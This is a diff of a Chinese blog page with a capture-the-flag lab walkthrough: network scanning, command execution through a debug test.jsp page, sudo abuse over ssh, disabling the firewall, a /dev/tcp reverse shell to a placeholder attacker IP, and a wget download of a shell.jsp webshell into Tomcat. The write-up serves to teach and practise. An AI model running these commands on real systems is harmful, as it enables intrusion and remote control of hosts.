@@ -249,19 +249,19 @@ document.addEventListener('pjax:error', (e) => {
 <h1 id="二、预备知识"><a href="#二、预备知识" class="headerlink" title="二、预备知识"></a>二、预备知识</h1><p>&emsp;&emsp;使用 <code>ssh 用户名@localhost</code> 通过ssh登录服务器是不需要身份验证的</p>
 <h1 id="三、信息收集"><a href="#三、信息收集" class="headerlink" title="三、信息收集"></a>三、信息收集</h1><h2 id="1、探测主机IP"><a href="#1、探测主机IP" class="headerlink" title="1、探测主机IP"></a>1、探测主机IP</h2><p>&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover</p>
 <h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888028567-436c33ce-2113-4b29-82d7-6509f75c0381.png" alt="img"></p>
 <h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><p>&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888053910-d470e9e5-c769-4c94-88e9-d57151d282b5.png" alt="img"></p>
 <p>&emsp;&emsp;使用netdiscover命令 <code>netdiscover -r ip/子网掩码</code> 命令来探测靶机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888190817-8138f7e8-dd3d-4641-9a4c-993c7df0276d.png" alt="img"></p>
 <h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap对IP进行扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;可以看到开放了8080端口，为HTTP服务</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888418264-d4bb0e6e-05d5-4e4f-b80b-9afeeb715300.png" alt="img"></p>
@@ -269,7 +269,7 @@ document.addEventListener('pjax:error', (e) => {
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888484073-cc45897a-36d0-4151-859a-4f3756a7b543.png" alt="img"></p>
 <h2 id="3、目录扫描"><a href="#3、目录扫描" class="headerlink" title="3、目录扫描"></a>3、目录扫描</h2><p>&emsp;&emsp;可以使用dirsearch扫描或者nikto探测</p>
 <h3 id="（1）dirsearch"><a href="#（1）dirsearch" class="headerlink" title="（1）dirsearch"></a>（1）dirsearch</h3><p>&emsp;&emsp;目录扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.107:8080</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.107:8080</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;扫出了个<code>/test.jsp</code></p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627714481394-793cd585-281c-4c0c-a0dd-100686418c23.png" alt="img"></p>
@@ -278,43 +278,43 @@ document.addEventListener('pjax:error', (e) => {
 <h1 id="四、漏洞探测与利用"><a href="#四、漏洞探测与利用" class="headerlink" title="四、漏洞探测与利用"></a>四、漏洞探测与利用</h1><h2 id="1、漏洞探测——命令执行"><a href="#1、漏洞探测——命令执行" class="headerlink" title="1、漏洞探测——命令执行"></a>1、漏洞探测——命令执行</h2><p>&emsp;&emsp;访问：<code>http://192.168.1.107:8080/test.jsp</code>，出现以下页面，这是一个调试页面，可以用来命令执行</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888844966-6ad86d97-315e-493b-a328-a179d0dc9bf1.png" alt="img"></p>
 <h2 id="2、信息收集"><a href="#2、信息收集" class="headerlink" title="2、信息收集"></a>2、信息收集</h2><p>&emsp;&emsp;查看临时缓冲目录，没什么有用的信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /tmp/</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -alh /tmp/</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890755332-793e01fb-8db4-45e0-9407-5a6a313b1d98.png" alt="img"></p>
 <p>&emsp;&emsp;查看home目录，挖掘用户信息，发现了bill</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /home</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -la /home</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888879666-caeef8fc-7376-4eeb-b998-f2dff92a7e57.png" alt="img"></p>
 <p>&emsp;&emsp;查看具体用户bill的目录，我们可以看到具有ssh服务，后续可以使用sudo来拿到root</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /home/bill -lah</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /home/bill -lah</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890826401-c5969405-0a1d-4bf2-9786-41da55dd1b9a.png" alt="img"></p>
 <p>&emsp;&emsp;查看系统信息，为ubuntu系统</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638891176526-0aa76660-1b06-4f13-b9b7-0255c9e0477f.png" alt="img"></p>
 <p>&emsp;&emsp;查看用户bill在主机上可以使用和禁止的命令，没什么有用的信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh bill@localhost sudo -l</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo -l</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888929543-acec2a55-46c0-42b9-bef4-49a8f82da9b0.png" alt="img"></p>
 <h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><p>&emsp;&emsp;关闭防火墙，没有消息就是好消息，关闭防火墙成功</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh bill@localhost sudo ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890317314-9933a34f-e2ad-4fdf-9a6f-95632003b44d.png" alt="img"></p>
 <p>&emsp;&emsp;kali打开nc监听某个端口，这里我设置为4444</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638889015592-7186314f-5027-4ef9-a7df-20a3cf07290f.png" alt="img"></p>
 <p>&emsp;&emsp;反弹shell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh bill@localhost sudo bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890413880-fad8ef90-a6dd-4925-92ba-b0275464e792.png" alt="img"></p>
 <p><strong>【插播：渗透测试技巧】</strong></p>
 <p>&emsp;&emsp;开启python简易http服务器</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;利用命令执行下载木马文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh bill@localhost sudo wget “http://ip:port/shell.jsp” -O /var /lib/tomcat8/webapps/ROOT/shell.jsp</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo wget “http://ip:port/shell.jsp” -O /var /lib/tomcat8/webapps/ROOT/shell.jsp</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;拿到flag</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890458865-543de0aa-dfe5-4431-b232-17b986961b35.png" alt="img"></p>
